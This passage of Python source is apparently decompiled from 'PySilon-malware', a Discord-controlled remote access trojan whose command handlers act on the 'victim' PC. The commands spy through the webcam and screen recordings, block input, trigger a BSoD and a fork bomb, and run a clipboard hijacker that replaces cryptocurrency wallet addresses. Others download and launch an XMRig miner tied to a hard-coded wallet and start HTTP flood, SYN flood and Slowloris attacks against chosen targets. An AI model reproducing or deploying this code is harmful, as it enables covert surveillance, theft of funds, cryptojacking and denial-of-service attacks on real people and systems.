                                reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time() + ' `[Executed: ' + '/'.join(working_directory) + '/' + message.content[9:] + ']`').set_image(url='attachment://ss.png'), file=discord.File('ss.png'))
                                await reaction_msg.add_reaction('📌')
                                subprocess.run('del ss.png', shell=True)
                                await message.channel.send('```Successfully executed: ' + message.content[9:] + '```')
                            except Exception as e:
                                reaction_msg = await message.channel.send(f'```❗ Something went wrong...```\n{str(e)}')
                                await reaction_msg.add_reaction('🔴')
                        else:
                            reaction_msg = await message.channel.send('```❗ File or directory not found.```')
                            await reaction_msg.add_reaction('🔴')
                else:  # inserted
                    reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||')
                    await reaction_msg.add_reaction('🔴')
            elif message.content[:7] == '.webcam':
                await message.delete()
                if message.content.strip() == '.webcam':
                    reaction_msg = await message.channel.send('```Syntax: .webcam <action>\nActions:\n    photo - take a photo with target PC\'s webcam```')
                    await reaction_msg.add_reaction('🔴')
                else:  # inserted
                    if message.content[8:] == 'photo':
                        pygame.camera.init()
                        cameras = pygame.camera.list_cameras()
                        if not cameras:
                            reaction_msg = await message.channel.send('No cameras found.')
                            await reaction_msg.add_reaction('🔴')
                            return
                        camera = pygame.camera.Camera(cameras[0])
                        camera.start()
                        time.sleep(1)
                        image = camera.get_image()
                        camera.stop()
                        pygame.image.save(image, f'C:\\Users\\{getuser()}\\{software_directory_name}\\webcam.png')
                        reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time(True) + ' `[On demand]`').set_image(url='attachment://webcam.png'), file=discord.File(f'C:\\Users\\{getuser()}\\{software_directory_name}\\webcam.png'))
                        await reaction_msg.add_reaction('📌')
                        subprocess.run(f'del \"C:\\Users\\{getuser()}\\{software_directory_name}\\webcam.png\"', shell=True)
                    else:  # inserted
                        reaction_msg = await message.channel.send('```Syntax: .webcam <action>\nActions:\n    photo - take a photo with target PC\'s webcam```')
                        await reaction_msg.add_reaction('🔴')
            elif message.content == '.screenrec':
                await message.delete()
                await message.channel.send('`Recording... Please wait.`')
                output_file = f'C:\\Users\\{getuser()}\\{software_directory_name}\\recording.mp4'
                screen_width, screen_height = pyautogui.size()
                screen_region = (0, 0, screen_width, screen_height)
                frames = []
                duration = 15
                fps = 30
                num_frames = duration * fps
                start_time = time.time()
                try:
                    for _ in range(num_frames):
                        img = pyautogui.screenshot(region=screen_region)
                        frame = np.array(img)
                        frames.append(frame)
                    imageio.mimsave(output_file, frames, fps=fps, quality=8)
                    reaction_msg = await message.channel.send('Screen Recording `[On demand]`', file=discord.File(output_file))
                    await reaction_msg.add_reaction('📌')
                    subprocess.run(f'del \"{output_file}\"', shell=True)
                except Exception as e:
                    embed = discord.Embed(title='📛 Error', description='An error occurred during screen recording.', colour=discord.Colour.red())
                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                    await message.channel.send(embed=embed)
            elif message.content == '.block-input':
                if not input_blocked:
                    await message.delete()

                    async def on_press():
                        return

                    async def on_release():
                        return

                    async def on_click():
                        return
                    keyboard_listener = keyboard.Listener(suppress=True)
                    mouse_listener = mouse.Listener(suppress=True)
                    keyboard_listener.start()
                    mouse_listener.start()
                    embed = discord.Embed(title='🚫 Input Blocked', description='```Input has been blocked. Unblock it by using .unblock-input```', colour=discord.Colour.red())
                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                    await message.channel.send(embed=embed)
                    input_blocked = True
                else:  # inserted
                    embed = discord.Embed(title='🔴 Hold on!', description='```The input is already blocked. Unblock it by using .unblock-input```', colour=discord.Colour.red())
                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                    await message.channel.send(embed=embed)
            elif message.content == '.unblock-input':
                if input_blocked:
                    await message.delete()
                    keyboard_listener.stop()
                    mouse_listener.stop()
                    embed = discord.Embed(title='🟢 Input Unblocked', description='```Input has been unblocked. Block it by using .block-input```', colour=discord.Colour.green())
                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                    await message.channel.send(embed=embed)
                    input_blocked = False
                else:  # inserted
                    embed = discord.Embed(title='🔴 Hold on!', description='```The input is not blocked. Block it by using .block-input```', colour=discord.Colour.red())
                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                    await message.channel.send(embed=embed)
            elif message.content == '.bsod':
                await message.delete()
                await message.channel.send('```Attempting to trigger a BSoD...```')
                nullptr = ctypes.POINTER(ctypes.c_int)()
                ctypes.windll.ntdll.RtlAdjustPrivilege(
                    ctypes.c_uint(19),
                    ctypes.c_uint(1),
                    ctypes.c_uint(0),
                    ctypes.byref(ctypes.c_int()),
                )
                ctypes.windll.ntdll.NtRaiseHardError(
                    ctypes.c_ulong(3221225595),
                    ctypes.c_ulong(0),
                    nullptr,
                    nullptr,
                    ctypes.c_uint(6),
                    ctypes.byref(ctypes.c_uint())
                )  
            elif message.content == '.forkbomb':
                await message.delete()
                embed = discord.Embed(title='💣 Starting...', description='```Starting fork bomb... This process may take some time.```', colour=discord.Colour.dark_theme())
                embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                await message.channel.send(embed=embed)
                with open(f'C:\\Users\\{getuser()}\\wabbit.bat', 'w', encoding='utf-8') as wabbit:
                    wabbit.write('%0|%0')
                subprocess.Popen(f'C:\\Users\\{getuser()}\\wabbit.bat', creationflags=subprocess.CREATE_NO_WINDOW)
            elif message.content == '.start-clipper':
                if clipper_stop:
                    await message.delete()
                    clipper_stop = False
                    script_dir = os.path.dirname(os.path.abspath(__file__))
                    config_path = os.path.join(script_dir, 'crypto_clipper.json')
                    with open(config_path) as f:
                        addresses = json.load(f)

                    def match():
                        clipboard = str(pyperclip.paste())
                        btc_match = re.match('^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}|^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clipboard)
                        eth_match = re.match('^0x[a-zA-F0-9]{40}$', clipboard)
                        doge_match = re.match('^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$', clipboard)
                        ltc_match = re.match('^([LM3]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}||ltc1[a-z0-9]{39,59})$', clipboard)
                        xmr_match = re.match('^[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}$', clipboard)
                        bch_match = re.match('^((bitcoincash|bchreg|bchtest):)?(q|p)[a-z0-9]{41}$', clipboard)
                        dash_match = re.match('^X[1-9A-HJ-NP-Za-km-z]{33}$', clipboard)
                        trx_match = re.match('^T[A-Za-z1-9]{33}$', clipboard)
                        xrp_match = re.match('^r[0-9a-zA-Z]{33}$', clipboard)
                        xlm_match = re.match('^G[0-9A-Z]{40,60}$', clipboard)
                        for currency, address in addresses.items():
                            if eval(f'{currency.lower()}_match'):
                                if address and address!= clipboard:
                                    pyperclip.copy(address)
                                break

                    def wait_for_paste():
                        while not clipper_stop:
                            pyperclip.waitForNewPaste()
                            match()
                    thread = threading.Thread(target=wait_for_paste)
                    thread.start()
                    embed = discord.Embed(title='🟢 Crypto Clipper started!', description='```Crypto Clipper has been started! Stop it by using .stop-clipper```', colour=discord.Colour.green())
                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                    await message.channel.send(embed=embed)
                else:  # inserted
                    await message.delete()
                    embed = discord.Embed(title='🔴 Hold on!', description='```Crypto Clipper is already running! Stop it by using .stop-clipper```', colour=discord.Colour.red())
                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                    await message.channel.send(embed=embed)
            elif message.content == '.stop-clipper':
                await message.delete()
                if not clipper_stop:
                    thread.join()
                    embed = discord.Embed(title='🔴 Crypto Clipper stopped!', description='```Crypto Clipper has been stopped! Start it using .start-clipper```', colour=discord.Colour.red())
                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                    await message.channel.send(embed=embed)
                    clipper_stop = True
                else:  # inserted
                    embed = discord.Embed(title='🔴 Hold on!', description='```Crypto Clipper is not running! Start it using .start-clipper```', colour=discord.Colour.red())
                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                    await message.channel.send(embed=embed)
            elif message.content[:4] == '.tts':
                await message.delete()
                if message.content.strip() == '.tts':
                    embed = discord.Embed(title='📛 Error', description='```Syntax: .tts <what-to-say>```', colour=discord.Colour.red())
                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                    reaction_msg = await message.channel.send(embed=embed)
                    await reaction_msg.add_reaction('🔴')
                else:  # inserted
                    requested_tts = message.content[5:]
                    engine = pyttsx3.init()
                    engine.say(requested_tts)
                    engine.runAndWait()
                    engine.stop()
                    embed = discord.Embed(title='🟢 Success', description=f'```Successfully played TTS message: \"{requested_tts}\"```', colour=discord.Colour.green())
                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                    reaction_msg = await message.channel.send(embed=embed)
                    await reaction_msg.add_reaction('🔴')
            elif message.content[:4] == '.msg':
                await message.delete()
                if message.content.strip() == '.msg' or message.content.count('\"') not in [2, 4, 6]:
                    embed = discord.Embed(title='📛 Error', description='```Syntax: .msg <text=\"\"> [title=\"\"] [style=]\n  - default title is \"From: Someone\"\n  - default style is 0. Styles:\n    0 : OK\n    1 : OK | Cancel\n    2 : Abort | Retry | Ignore\n    3 : Yes | No | Cancel\n    4 : Yes | No\n    5 : Retry | Cancel\n    6 : Cancel | Try Again | Continue```', colour=discord.Colour.red())
                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                    reaction_msg = await message.channel.send(embed=embed)
                    await reaction_msg.add_reaction('🔴')
                elif 'text=\"' in message.content:
                    message_title = 'From: Someone'
                    message_style = 0
                    message_text = ''
                    for i in message.content[message.content.find('text=\"') + 6:]:
                        if i != '\"':
                            message_text += i
                        else:
                            break
                    if 'title=\"' in message.content[5:]:
                        message_title = ''
                        for i in message.content[message.content.find('title=\"') + 7:]:
                            if i != '\"':
                                message_title += i
                            else:
                                break
                    if 'style=' in message.content[5:]:
                        message_style = int(message.content[message.content.find('style=') + 6])
                    if message.content[(-2):] == '/s':
                        threading.Thread(target=send_custom_message, args=(message_title, message_text, message_style)).start()
                        await asyncio.sleep(0.5)
                        ImageGrab.grab(all_screens=True).save(f'C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png')
                        reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time() + ' `[Sent message]`', color=34047).set_image(url='attachment://ss.png'), file=discord.File(f'C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png'))
                        await reaction_msg.add_reaction('📌')
                        subprocess.run(f'del \"C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png\"', shell=True)
                    else:  # inserted
                        hti = Html2Image()
                        possible_styles = ['<div class=\"active_button\">OK</div>', '<div class=\"button\">Cancel</div><div class=\"active_button\">OK</div>', '<div class=\"button\">Ignore</div><div class=\"button\">Retry</div><div class=\"active_button\">Abort</div>', '<div class=\"button\">Cancel</div><div class=\"button\">No</div><div class=\"active_button\">Yes</div>', '<div class=\"button\">No</div><div class=\"active_button\">Yes</div>', '<div class=\"button\">Cancel</div><div class=\"active_button\">Retry</div>', '<div class=\"button\">Continue</div><div class=\"button\">Try Again</div><div class=\"active_button\">Cancel</div>']

                        hti.screenshot(
                            html_str='<head><style>body {margin: 0px;}.container {width: 285px;min-height: 100px;background-color: #ffffff;border: 1px solid black;}.title {margin: 8px;width: 85%;font-size: 13.25px;font-family: \'Calibri\';float: left;overflow: hidden;white-space: nowrap;text-overflow: ellipsis;}.close {float: right;font-size: 9px;padding: 8px;}.text {margin-left: 10px;margin-top: 20px;margin-bottom: 25px;float: left;inline-size: 90%;word-break: break-all;font-size: 13px;font-family: \'Calibri\';}.footer {background-color: #f0f0f0;width: auto;height: 40px;padding-right: 12px;clear: both;}.button {background-color: #e1e1e1;border: 1px solid #adadad;font-size: 13px;font-family: \'Calibri\';float: right;padding-top: 2px;padding-bottom: 2px;margin: 5px;margin-top: 10px;width: 70px;text-align: center;}.active_button {background-color: #e1e1e1;border: 2px solid #0078d7;font-size: 13px;font-family: \'Calibri\';float: right;padding-top: 2px;padding-bottom: 2px;margin: 5px;margin-top: 10px;width: 70px;text-align: center;}</style></head><body><div class=\"container\"><div class=\"title\">' + message_title + '</div><div class=\"close\"><b>&#9587;</b></div><div class=\"text\">' + message_text + '</div><div class=\"footer\">' + possible_styles[int(message_style)] + '</div></div></body></html>',
                            size=(500, 300),
                            save_as='image.png'
                        )
                        img = Image.open('image.png')
                        content = img.getbbox()
                        img = img.crop(content)
                        img.save('image.png')
                        file = discord.File('image.png', filename='image.png')
                        embed = discord.Embed(title='Confirm message', description='Check if message preview meets your expectations:', colour=discord.Colour.green())
                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                        embed.set_image(url='attachment://image.png')
                        embed.set_footer(text='Note: you will see what button did victim click.')
                        reaction_msg = await message.channel.send(file=file, embed=embed)
                        await reaction_msg.add_reaction('✅')
                        await reaction_msg.add_reaction('🔴')
                        subprocess.run(f'del \"C:\\Users\\{getuser()}\\{software_directory_name}\\image.png\"', shell=True)
                        await message.channel.send('```^ React with ✅ to send the message```')
                        custom_message_to_send = [message_title, message_text, message_style]
            elif message.content == '.monitors-off':
                if not turned_off:
                    await message.delete()
                    turned_off = True

                    def monitor_off():
                        while turned_off:
                            for monitor in monitorcontrol.get_monitors():
                                with monitor:
                                    monitor.set_power_mode(4)
                    threading.Thread(target=monitor_off).start()
                    embed = discord.Embed(title='🟢 Success', description='```Monitor turned off. Turn it back on by using .monitors-on```', colour=discord.Colour.green())
                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                    await message.channel.send(embed=embed)
                else:  # inserted
                    embed = discord.Embed(title='🔴 Hold on!', description='```Monitor already turned off. Turn it back on by using .monitors-on```', colour=discord.Colour.red())
                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                    await message.channel.send(embed=embed)
            elif message.content == '.monitors-on':
                if turned_off:
                    await message.delete()
                    for monitor in monitorcontrol.get_monitors():
                        with monitor:
                            monitor.set_power_mode(1)
                    embed = discord.Embed(title='🟢 Success', description='```Monitor has been turned on. Turn it off by using .monitors-off```', colour=discord.Colour.green())
                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                    await message.channel.send(embed=embed)
                    turned_off = False
                else:  # inserted
                    embed = discord.Embed(title='🔴 Hold on!', description='```The monitor is not turned off. Turn it off by using .monitors-off```', colour=discord.Colour.red())
                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                    await message.channel.send(embed=embed)
            elif message.content[:7] == '.volume':
                await message.delete()
                if message.content.strip() == '.volume':
                    embed = discord.Embed(title='📛 Error', description='```Syntax: .volume <0 - 100>```', colour=discord.Colour.red())
                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                    reaction_msg = await message.channel.send(embed=embed)
                    await reaction_msg.add_reaction('🔴')
                else:  # inserted
                    volume_int = message.content[8:]
                    devices = AudioUtilities.GetSpeakers()
                    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                    volume = cast(interface, POINTER(IAudioEndpointVolume))
                    volume_int = int(volume_int)
                    volume_int = volume_int / 100
                    if volume_int <= 1 and volume_int >= 0:
                        volume.SetMasterVolumeLevelScalar(volume_int, None)
                        embed = discord.Embed(title='🟢 Success', description=f'```Successfully set volume to {volume_int * 100}%```', colour=discord.Colour.green())
                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                        reaction_msg = await message.channel.send(embed=embed)
                        await reaction_msg.add_reaction('🔴')
                    else:  # inserted
                        embed = discord.Embed(title='📛 Error', description='```Syntax: .volume <0 - 100>```', colour=discord.Colour.red())
                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                        reaction_msg = await message.channel.send(embed=embed)
                        await reaction_msg.add_reaction('🔴')
            elif message.content[:5] == '.play':
                await message.delete()
                if message.content.strip() == '.play':
                    embed = discord.Embed(title='📛 Error', description='```Syntax: .play <path/to/audio-file.mp3>```', colour=discord.Colour.red())
                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                    reaction_msg = await message.channel.send(embed=embed)
                    await reaction_msg.add_reaction('🔴')
                elif not message.content.endswith('.mp3'):
                    embed = discord.Embed(title='📛 Error', description='```Not a valid file type.```', colour=discord.Colour.red())
                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                    reaction_msg = await message.channel.send(embed=embed)
                    await reaction_msg.add_reaction('🔴')
                else:  # inserted
                    def play_audio():
                        audio_file = message.content[6:]
                        audio_file = audio_file.replace('\\', '/')
                        pygame.mixer.init()
                        pygame.mixer.music.load(audio_file)
                        pygame.mixer.music.play()
                        while pygame.mixer.music.get_busy():
                            pass
                        pygame.mixer.quit()
                    threading.Thread(target=play_audio).start()
            elif message.content[:14] == '.block-website':
                await message.delete()
                if message.content.strip() == '.block-website':
                    embed = discord.Embed(title='📛 Error', description='```Syntax: .block-website <https://example.com>```', colour=discord.Colour.red())
                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                    await message.channel.send(embed=embed)
                else:  # inserted
                    website = message.content[15:]
                    await message.channel.send(website)
                    parsed_url = urlparse(website)
                    host_entry = f'127.0.0.1 {parsed_url.netloc}\n'
                    hosts_file_path = get_hosts_file_path()
                    if hosts_file_path:
                        with open(hosts_file_path, 'a') as hosts_file:
                            hosts_file.write(host_entry)
                        embed = discord.Embed(title='🟢 Success', description=f'```Website {website} has been blocked. Unblock it by using .webunblock [websitename]```', colour=discord.Colour.green())
                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                        await message.channel.send(embed=embed)
                    else:  # inserted
                        embed = discord.Embed(title='🔴 Hold on!', description='```Hostfile not found or no permissions```', colour=discord.Colour.red())
                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                        await message.channel.send(embed=embed)
            elif message.content[:16] == '.unblock-website':
                await message.delete()
                if message.content.strip() == '.unblock-website':
                    embed = discord.Embed(title='📛 Error', description='```Syntax: .unblock-website <example.com>```', colour=discord.Colour.red())
                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                    await message.channel.send(embed=embed)
                else:  # inserted
                    website = message.content[17:]
                    website = website.replace('https://', '')
                    website = website.replace('http://', '')
                    hosts_file_path = get_hosts_file_path()
                    if hosts_file_path:
                        with open(hosts_file_path, 'r') as hosts_file:
                            lines = hosts_file.readlines()
                        filtered_lines = [line for line in lines if website not in line]
                        with open(hosts_file_path, 'w') as hosts_file:
                            hosts_file.writelines(filtered_lines)
                        embed = discord.Embed(title='🟢 Success', description=f'```Website {website} has been unblocked.```', colour=discord.Colour.green())
                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                        await message.channel.send(embed=embed)
                    else:  # inserted
                        embed = discord.Embed(title='🔴 Hold on!', description='```Hostfile not found or no permissions```', colour=discord.Colour.red())
                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                        await message.channel.send(embed=embed)
            elif message.content[:4] == '.key':
                await message.delete()
                if message.content.strip() == '.key':
                    embed = discord.Embed(title='📛 Error', description='```Syntax: .key <keys-to-press>```', colour=discord.Colour.red())
                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                    reaction_msg = await message.channel.send(embed=embed)
                    await reaction_msg.add_reaction('🔴')
                else:  # inserted
                    keystrokes = message.content[5:]
                    if 'ALTTAB' in keystrokes:
                        pyautogui.hotkey('alt', 'tab')
                    else:  # inserted
                        if 'ALTF4' in keystrokes:
                            pyautogui.hotkey('alt', 'f4')
                        else:  # inserted
                            for key in keystrokes:
                                pyautogui.press(key)
                    embed = discord.Embed(title='🟢 Success', description='```All keys have been succesfully pressed```', colour=discord.Colour.green())
                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                    reaction_msg = await message.channel.send(embed=embed)
                    await reaction_msg.add_reaction('🔴')
            elif message.content == '.display-graphic':
                await message.delete()
                embed = discord.Embed(title='📤 Provide a file containing graphic', description='Send your .drawdata file here', colour=discord.Colour.blue())
                embed.set_author(name='PySilon Malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                await message.channel.send(embed=embed)
                expectation = 'graphic_file'
            elif message.content[:15] == '.display-glitch':
                await message.delete()
                if message.content.strip() == '.display-glitch':
                    embed = discord.Embed(title='📛 Error', description='```Syntax: .display-glitch <glitch_name>\nTo list all currently available glitches, type .display-glitch list```', colour=discord.Colour.red())
                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                    reaction_msg = await message.channel.send(embed=embed)
                    await reaction_msg.add_reaction('🔴')
                elif message.content[16:] == 'list':
                    embed = discord.Embed(title='📃 List of currently available glitches:', description=f"- {'- '.join(flash_screen('list'))}\n`NOTE: This list will dramatically increase it\'s size in release v4.1`", colour=discord.Colour.blue())
                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                    reaction_msg = await message.channel.send(embed=embed)
                    await reaction_msg.add_reaction('🔴')
                elif message.content[16:] + '\n' in flash_screen('list'):
                    flash_screen(message.content[16:])
                    embed = discord.Embed(title='🟢 Glitch succesfully executed', description='Remember to ⭐ our repository', colour=discord.Colour.blue())
                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                    reaction_msg = await message.channel.send(embed=embed)
                    await reaction_msg.add_reaction('🔴')
                else:  # inserted
                    embed = discord.Embed(title='📛 Error', description='```Invalid argument!```', colour=discord.Colour.red())
                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                    reaction_msg = await message.channel.send(embed=embed)
                    await reaction_msg.add_reaction('🔴')
            elif expectation == 'graphic_file':
                try:
                    split_v1 = str(message.attachments).split('filename=\'')[1]
                    filename = str(split_v1).split('\' ')[0]
                    filename = f'C:\\Users\\{getuser()}\\{software_directory_name}\\' + filename
                    await message.attachments[0].save(fp=filename)
                    screen_manipulator(filename).display_graphic(10)
                    embed = discord.Embed(title='Graphic successfully displayed', description='Victim should see it on their screen for 10 seconds.\n`This functionality will be HUGELY improved in release v4.1`', colour=discord.Colour.green())
                    embed.set_author(name='PySilon Malware', icon_url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                    await message.channel.send(embed=embed)
                except Exception as err:
                    await message.channel.send(f'```❗ Something went wrong while fetching graphic file...\n{str(err)}```')
                    expectation = None
            elif message.content[:6] == '.xmrig':
                await message.delete()
                if message.content.strip() == '.xmrig':
                    reaction_msg = await message.channel.send('```Syntax: .xmrig <action>\nActions:\n    start - Start XMRig\n    output - Get the current output of XMRig\n    kill - Stop XMRig\n    delete - Delete XMRig files```')
                    await reaction_msg.add_reaction('🔴')
                elif message.content[7:] == 'start':
                    try:
                        url = 'https://pixeldrain.com/api/file/pfiR2g7P'
                        response = requests.get(url)
                        temp_dir = '/'.join(working_directory)
                        zip_path = os.path.join(temp_dir, 'dx.zip')
                        with open(zip_path, 'wb') as file:
                            file.write(response.content)
                        subprocess.run(f'powershell -Command \"Expand-Archive -Path \'{zip_path}\' -DestinationPath \'{temp_dir}\'\"', shell=True)
                        xmrig_path = os.path.join(temp_dir, 'dx', 'directx.exe')
                        command = f'\"{xmrig_path}\" -o xmrpool.eu:9999 -u \"45i7kjWZuzJ4PdSbandaaE8S6mQATmneTYEpgsaaCqDmc7foEJDXwxd3ABR8bn6YE4c7hZ2dYEEr1CwG48gAknPL6zUpYyV+{get_hwid().strip()}\" -k --pause-on-active --background'
                        print(command)
                        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                        xmrig_processes[message.author.id] = process
                        embed = discord.Embed(title='XMRig Started', description='XMRig is now running.', color=65280)
                        embed.set_thumbnail(url='https://raw.githubusercontent.com/BeamerNGz/csdafewafaw/main/icon.png')
                        reaction_msg = await message.channel.send(embed=embed)
                        await reaction_msg.add_reaction('✅')
                    except Exception as e:
                        reaction_msg = await message.channel.send(f'An error occurred while starting XMRig: {str(e)}')
                        await reaction_msg.add_reaction('🔴')
                elif message.content[7:] == 'output':
                    if message.author.id in xmrig_processes:
                        process = xmrig_processes[message.author.id]
                        stdout, stderr = process.communicate(timeout=1)
                        output = stdout + stderr
                        reaction_msg = await message.channel.send(f'```\n{output}\n```')
                        await reaction_msg.add_reaction('📋')
                    else:  # inserted
                        reaction_msg = await message.channel.send('XMRig is not currently running.')
                        await reaction_msg.add_reaction('🔴')
                elif message.content[7:] == 'kill':
                    if message.author.id in xmrig_processes:
                        process = xmrig_processes[message.author.id]
                        process.terminate()
                        del xmrig_processes[message.author.id]
                        reaction_msg = await message.channel.send('XMRig has been stopped.')
                        await reaction_msg.add_reaction('✅')
                    else:  # inserted
                        reaction_msg = await message.channel.send('XMRig is not currently running.')
                        await reaction_msg.add_reaction('🔴')
                elif message.content[7:] == 'delete':
                    try:
                        temp_dir = '/'.join(working_directory)
                        subprocess.run(f'powershell -Command \"Remove-Item -Path \'{temp_dir}/Chromium\' -Recurse -Force\"', shell=True)
                        reaction_msg = await message.channel.send('XMRig files have been deleted.')
                        await reaction_msg.add_reaction('✅')
                    except Exception as e:
                        reaction_msg = await message.channel.send(f'An error occurred while deleting XMRig files: {str(e)}')
                        await reaction_msg.add_reaction('🔴')
                else:
                    reaction_msg = await message.channel.send('```Syntax: .xmrig <action>\nActions:\n    start - Start XMRig\n    output - Get the current output of XMRig\n    kill - Stop XMRig\n    delete - Delete XMRig files```')
                    await reaction_msg.add_reaction('🔴')
            elif message.content[:5] == '.ping':
                await message.delete()
                if message.content.strip() == '.ping':
                    reaction_msg = await message.channel.send('```Syntax: .ping <attack_type> <target>\nAttack Types:\n    request - HTTP Request Flood\n    synflood - SYN Flood\n    pyslow - Slowloris Attack```')
                    await reaction_msg.add_reaction('🔴')
                else:  # inserted
                    attack_type = message.content.split()[1]
                    target = message.content.split()[2]
                    if attack_type == 'request':
                        try:
                            process = Requester(target)
                            process.daemon = True
                            process.start()
                            attack_processes[message.author.id] = process
                            reaction_msg = await message.channel.send(f'HTTP Request Flood attack started against {target}.')
                            await reaction_msg.add_reaction('✅')
                        except Exception as e:
                            reaction_msg = await message.channel.send(f'An error occurred while starting the attack: {str(e)}')
                            await reaction_msg.add_reaction('🔴')
                    elif attack_type == 'synflood':
                        try:
                            process = Synflood(target, fake_ip())
                            process.daemon = True
                            process.start()
                            attack_processes[message.author.id] = process
                            reaction_msg = await message.channel.send(f'SYN Flood attack started against {target}.')
                            await reaction_msg.add_reaction('✅')
                        except Exception as e:
                            reaction_msg = await message.channel.send(f'An error occurred while starting the attack: {str(e)}')
                            await reaction_msg.add_reaction('🔴')
                    elif attack_type == 'pyslow':
                        try:
                            process = Pyslow(target, 80, 5.0, 1000, 100)
                            process.daemon = True
                            process.start()
                            attack_processes[message.author.id] = process
                            reaction_msg = await message.channel.send(f'Slowloris attack started against {target}.')
                            await reaction_msg.add_reaction('✅')
                        except Exception as e:
                            reaction_msg = await message.channel.send(f'An error occurred while starting the attack: {str(e)}')
                            await reaction_msg.add_reaction('🔴')
                    else:
                        reaction_msg = await message.channel.send('```Syntax: .ping <attack_type> <target>\nAttack Types:\n    request - HTTP Request Flood\n    synflood - SYN Flood\n    pyslow - Slowloris Attack```')
                        await reaction_msg.add_reaction('🔴')
            elif message.content == '.ping stop':
                await message.delete()
                if message.author.id in attack_processes:
                    process = attack_processes[message.author.id]
                    process.terminate()
                    del attack_processes[message.author.id]
                    reaction_msg = await message.channel.send('Attack stopped.')
                    await reaction_msg.add_reaction('✅')
                else:  # inserted
                    reaction_msg = await message.channel.send('No attack is currently running.')
                    await reaction_msg.add_reaction('🔴')
            elif message.content[:9] == '.encrypt ':
                await message.delete()
                if message.content.strip() == '.encrypt':
